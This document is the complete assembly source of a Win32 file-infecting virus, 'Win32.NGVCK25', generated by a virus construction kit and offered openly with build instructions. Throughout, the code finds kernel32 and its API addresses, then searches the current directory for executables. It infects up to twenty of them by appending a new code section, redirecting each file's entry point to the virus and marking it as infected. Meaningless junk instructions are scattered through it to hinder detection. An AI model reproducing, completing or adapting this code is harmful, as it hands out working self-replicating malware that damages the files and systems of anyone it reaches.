              
;
;
; Win32.NGVCK25 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK25
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 22
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebx
                                        ; mov ebp, ebx
 mov ebp, ebx
 sub ebp, offset Delta
 jmp KernelSearchStart
 mov eax, eax                           ; Trash


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 mov eax, 11362d
 sub eax, 11362d

 push eax
 push eax
 adc dword ptr [ebp+Trash1], eax        ; Trash
 push 3h
 push eax
                                        ; add eax, 1
 add eax, 1d
 push eax
 push 80000000h or 40000000h
 mov edx, ebp
 add edx, offset WFD_szFileName

 push edx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 and ecx, 0
 push ecx
 push ebx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz CloseFile
 push ebx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:

 APINames:
 db 'GetFileAttributesA', 0
 db 'FindFirstFileA', 0
 db 'MapViewOfFile', 0
 db 'CloseHandle', 0
 db 'FindNextFileA', 0
 db 'CreateFileMappingA', 0
 db 'FindClose', 0
 db 'UnmapViewOfFile', 0
 db 'CreateFileA', 0
 db 'SetFileAttributesA', 0


 db 'Win32.NGVCK25 of SnakeByte',0
 OldBase     dd 400000h
 PEheader    dd 0h
 FileHandle  dd 0h
 ATableVA    dd 0h
 AlignReg2   dd 0h
 AlignReg1   dd 0h
 KernelMZ    dd 0h
 KernelPE    dd 0h
 MapAddress  dd 0h
 Trash1      dd 0h
 FindHandle  dd 0h
 OldEIP      dd 0h

 APIOffsets:
 XGetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileA           dd 0h
 XSetFileAttributesA    dd 0h

newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 sectionalign   dd 0h
 Misc1       dd 0h
 TempAPI     dd 0h
 MapHandle   dd 0h
 filealign   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 counter     dw 0h
 OTableVA    dd 0h
 Attributes  dd 0h
 NewSize     dd 0h
 TempApisearch2 dd 0h
 InfCounter  dd 0h
 NewEIP      dd 0h
 filemask    db '*.eXE',0
 NTableVA    dd 0h




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 sub edx, edx
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
 add ecx, ebx                           ; Trash
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov esi, -1
 mov esi, 0
 add esi, -1d
 and esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi

                                        ; mov ebx, -1
 mov ebx, ( -1d xor 26d )
 xor ebx, 26d
 and ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 push edx
ret

 dec dword ptr [ebp+Trash1]             ; Trash


;          [ ///// * FindFiles Procedure * \\\\\ ]

 xor ebx, ecx                           ; Trash
                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 adc dword ptr [ebp+Trash1], 261750     ; Trash
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, ebx

 push ebx
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 mov edx, ecx                           ; Trash
 pop dword ptr [ebp+FindHandle]
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 ror ebx, 29d                           ; Trash
 lea eax, [ebp+WIN32_FIND_DATA]
 xchg esi, eax

 push esi
 push dword ptr [ebp+FindHandle]
 pop eax
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, 276d
 lea ebx, [ebp+WFD_szFileName]
 xchg ecx, ebx


ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 add ecx, 1d
 dec edx
 jnz ClearOldData2
 popad
ret





;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea edx, [ebp+WFD_szFileName]
 xchg edx, ecx

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov edx, ebp
 add edx, offset WFD_szFileName


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 mov ebx, 84832496d                     ; Trash
 cmp eax, 0
 je NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je Goodfile
                                        ; mov ecx, 7351
 mov ecx, 0
 add ecx, 7351d
 test ecx, ecx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [esi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [esi+3Ch]
 pop edi
 mov dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, esi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
 rol edx, 12d                           ; Trash
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov bx, word ptr [edi+16h]
 and bx, 0F000h
 or edx, 4228930d                       ; Trash
 cmp bx, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [edi+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ebx
 xor ecx, 94361909d                     ; Trash
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 mov ecx, ebp
 add ecx, offset APIOffsets

 mov edi, offset APINames
 add edi, ebp


GetApisLoop: 

 push edi
 pop edx
APINameDetect:                          ; calculate the lenght of the names
 add edx, 1d
 cmp byte ptr [edx], 0
 jne APINameDetect

 push edx
 sub dword ptr [esp], edi
 pop edx
                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; edi points to the Name
                                        ; ecx points to the offset

 call SearchAPI1
                                        ; add edi, 1
 add edi, 1d
 add edi, edx
                                        ; clear esi
 mov esi, 0
 xor esi, dword ptr [ebp+TempAPI]
 mov dword ptr [ecx], 0
 add dword ptr [ecx], esi
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 dec ebx
 jnz GetApisLoop
 lea esi, [ebp+Outbreak]
 xchg esi, edx
 adc eax, 79037470d                     ; Trash

 push edx
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; edi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear ebx
 mov ebx, 0
 add ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 mov esi, 41105d
 sub esi, 41105d
 add esi, [ebx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 dec esi
 add esi, 29d
                                        ; get ATableVA
 mov ebx, dword ptr [esi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add esi, 4
 add esi, 4d
                                        ; get NTableVA
 mov ebx, dword ptr [esi]
                                        ; add esi, 4
 add esi, 4d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [esi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
 mov ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 push dword ptr [ebp+KernelMZ]
 pop ebx
 add ebx, dword ptr [ecx]
                                        ; mov ecx, ebx
                                        ; clear ecx
 and ecx, 0
 add ecx, ebx
                                        ; mov eax, ebx
                                        ; clear eax
 mov eax, 56388d
 sub eax, 56388d
 add eax, ebx
 push edx
 mov dword ptr [ebp+TempApisearch2], eax
 push edi
 cld

                                        ; eax Points to API-Name ( Kernel )
                                        ; edi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bl, byte ptr [eax]
 cmp bl, byte ptr [edi]
 jne ApiNotFound
 sub edx, 1
 cmp edx, 0
 je FoundApi1
                                        ; add edi, 1
 sub edi, -1d
                                        ; add eax, 1
 sub eax, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop edx
 pop ecx
 mov eax, dword ptr [ebp+TempApisearch2]
                                        ; add ecx, 4
 add ecx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ecx
 add esp, 4h
 pop eax
                                        ; retrieve the offset
                                        ; clear ecx
 mov ecx, 0
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop ebx
 movzx ecx, word ptr [ebx]
 ror eax, 27d                           ; Trash
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ecx]
 add ebx, dword ptr [ebp+KernelMZ]
 push ebx
 pop dword ptr [ebp+TempAPI]
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov ebx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov ebx, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov ebx, 077f00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ecx
 push 0
 pop ecx

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ecx]
 shl edx, 11d                           ; Trash
 mov edi, offset GetKernel32Exception
 add edi, ebp
 shl ecx, 22d                           ; Trash

 push edi
 push eax

                                        ; add ebx, 1
 add ebx, 1d
GetKernelLoop:
                                        ; clear edx
 mov edx, -34398d
 add edx, 34398d
 sub ebx, 1
 mov dx, word ptr [ebx+03ch]
 test dx,0f800h
 jnz GetKernelLoop
 cmp ebx, dword ptr [ebx+edx+34h]
 jnz GetKernelLoop
 sub dword ptr [ebp+Trash1], ecx        ; Trash
 push ebx
 pop dword ptr [ebp+KernelMZ]
 mov edx, [ebx+3Ch]
 add edx, ebx
 mov [KernelPE+ebp], edx

                                        ; clear ebx
 mov ebx, 61926d
 sub ebx, 61926d

 pop dword ptr fs:[ebx]
 pop ecx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear eax
 xor eax, eax

 shr ebx, 27d                           ; Trash
 mov edx, dword ptr fs:[eax]
 mov esp, dword ptr [edx]
GetKernel32NotFound:
                                        ; clear edi
 mov edi, 19502d
 sub edi, 19502d

 pop dword ptr fs:[edi]
 pop edx
 popad
 stc
ret


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

 rol ecx, 12d                           ; Trash
InfectEXE:                              ; infect an exe file
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, [esi+3Ch]
 add ecx, esi
                                        ; get File Alignment
                                        ; add ecx, 60
 add ecx, 60d
 mov edx, [ecx]
                                        ; mov eax, 60
 push 60d
 pop eax
 sub ecx, eax
 mov dword ptr [ebp+filealign], edx
                                        ; mov esi, -1
 mov esi, ( -1d - 6d )
 add esi, 6d
 and esi, dword ptr [ebp+MapAddress]
 shl ecx, 29d                           ; Trash
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edx
                                        ; get old Entrypoint
 mov ebx, dword ptr [edx+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ebx
 mov ebx, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], ebx
 mov ebx, [edx+38h]
 mov dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov eax, [edx+74h]
 shl eax, 3
                                        ; clear ebx
 mov ebx, -28605d
 add ebx, 28605d
 mov bx, word ptr [edx+6h]
 mov ecx, 28h
 pushad
 mov eax, ebx
 mul ecx
 mov dword ptr [ebp+Misc1], -1
 and dword ptr [ebp+Misc1], eax
 popad
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+Misc1]
 add edx, 78h
 add edx, eax
 add edx, ebx
 lea ecx, [ebp+newsection]
 xchg eax, ecx


 xchg eax, edx
 push eax
                                        ; Calculate the RVA of the new section
 mov edx, [eax-5*8+8d]
 add edx, [eax-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], edx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], 0
 xor dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov edx,[eax-5*8+20d]
 add edx,[eax-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], edx
 push ecx
 pop dword ptr [ebp+AlignReg2]
 Call Align
                                        ; mov edx, -1
 mov edx, ( -1d + 8d )
 sub edx, 8d
 and edx, dword ptr [ebp+AlignReg1]
 push edx
 pop dword ptr [ebp+nsphysicaloffset]
                                        ; calculate new size
 mov ebx, dword ptr [ebp+filealign]
 mov eax, edx
 add eax, VirusSize
 push ebx
 pop dword ptr [ebp+AlignReg2]
 push eax
 xor dword ptr [ebp+Trash1], 1019140    ; Trash
 pop dword ptr [ebp+AlignReg1]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop eax
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+Trash1], ecx        ; Trash
 xor dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 lea eax, [ebp+newsection]
 xchg eax, edx

 pop ecx
                                        ; mov ebx, 64
 mov ebx, 64d
WriteNewSectionLoop:
 mov ah, byte ptr [edx]
 add dword ptr [ebp+Trash1], eax        ; Trash
 mov byte ptr [ecx], ah
 sub dword ptr [ebp+Trash1], edx        ; Trash
                                        ; add edx, 1
 inc edx
                                        ; add ecx, 1
 add ecx, 1d
 add ebx, -1
 or ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+PEheader]
 add word ptr [ecx+06h], 1
                                        ; clear eax
 mov eax, -35695d
 add eax, 35695d
 add eax, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ecx+28h], eax
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], 'NGVC'
                                        ; mov edx, -1
 push -1d
 pop edx
 and edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 mov esi, ebp
 sub eax, 27831436d                     ; Trash
 add esi, offset Virus


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 sub edx, 1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 pop edx
 stc
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear edi
 push 0
 pop edi
 add edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov esi, offset filemask
 add esi, ebp

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
                                        ; mov ebx, 20
 mov ebx, ( 20d xor 4d )
 xor ebx, 4d
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], ebx

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+InfCounter]
 or ecx, ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop edx
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear eax
 mov eax, 58118d
 sub eax, 58118d
 push eax
 call ExitProcess



end FakeCode

